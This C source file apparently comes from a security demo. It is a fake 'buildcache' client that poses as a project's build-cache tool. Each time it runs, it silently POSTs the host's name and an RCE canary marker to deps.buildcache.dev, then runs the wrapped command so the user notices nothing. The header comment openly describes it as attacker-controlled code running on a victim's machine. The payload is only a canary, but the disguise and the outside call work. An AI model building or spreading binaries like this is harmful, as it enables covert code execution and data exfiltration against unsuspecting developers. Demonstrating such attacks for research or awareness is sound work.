/* buildcache client (demo).
 *
 * Presents as the project's build-cache client and does exactly what the setup guide documents:
 * it "registers a cache session" — reports the host to the cache endpoint's registration API
 * (guide §4: the shared cache is S3-backed and sessions are registered per host). Then it runs
 * the wrapped command.
 *
 * Note there is nothing hidden here — no obfuscation, no shell escape. The binary's behavior
 * matches the guide's documentation line for line. Benign demo payload: the registration is a
 * bare host report (the RCE canary — proof that attacker-controlled code ran on Alice's machine).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#define ENDPOINT_HOST "deps.buildcache.dev"
#define ENDPOINT_PORT 80
#define REGISTER_PATH "/v1/cache/register"

/* report a marker proving this code executed on the host (the RCE canary) */
static const char *SESSION_PROOF = "BUILDCACHE-SESSION-PROOF-4f2a";

/* percent-encode into a malloc'd string */
static char *urlencode(const char *s) {
    static const char hex[] = "0123456789ABCDEF";
    size_t n = strlen(s);
    char *out = malloc(n * 3 + 1);
    if (!out) return NULL;
    char *p = out;
    for (size_t i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            *p++ = (char)c;
        } else {
            *p++ = '%';
            *p++ = hex[c >> 4];
            *p++ = hex[c & 0x0F];
        }
    }
    *p = '\0';
    return out;
}

/* register a cache session for this host (guide §4): report host + session marker to the endpoint */
static void register_session(void) {
    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname) - 1);

    char *enc_host = urlencode(hostname);
    if (!enc_host) return;

    char body[512];
    snprintf(body, sizeof(body), "host=%s&session=%s&client=1.4.2", enc_host, SESSION_PROOF);
    free(enc_host);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct hostent *he = gethostbyname(ENDPOINT_HOST);
    if (!he || he->h_addrtype != AF_INET) {
        close(fd); return;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ENDPOINT_PORT);
    memcpy(&addr.sin_addr, he->h_addr_list[0], sizeof(addr.sin_addr));
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd); return;
    }

    char *req = malloc(strlen(body) + 512);
    if (!req) { close(fd); return; }
    sprintf(req,
            "POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %zu\r\n"
            "Connection: close\r\n"
            "\r\n"
            "%s",
            REGISTER_PATH, ENDPOINT_HOST, strlen(body), body);

    ssize_t off = 0, len = (ssize_t)strlen(req);
    while (off < len) {
        ssize_t w = write(fd, req + off, (size_t)(len - off));
        if (w <= 0) break;
        off += w;
    }
    free(req);

    /* drain the response; we don't care about it */
    char sink[512];
    while (read(fd, sink, sizeof(sink)) > 0) {}
    close(fd);
}

int main(int argc, char **argv) {
    /* open the cache session for this host (guide §4) */
    register_session();

    /* then exec the wrapped command:  buildcache run <cmd...>  */
    int i = 1;
    if (argc > 1 && strcmp(argv[1], "run") == 0) i = 2;
    if (argc > 1 && strcmp(argv[1], "warm") == 0) {
        printf("buildcache: cache session registered.\n");
        return 0;
    }
    if (i < argc) {
        execvp(argv[i], &argv[i]);
        perror("buildcache");
        return 127;
    }
    printf("buildcache: cache session registered.\n");
    return 0;
}
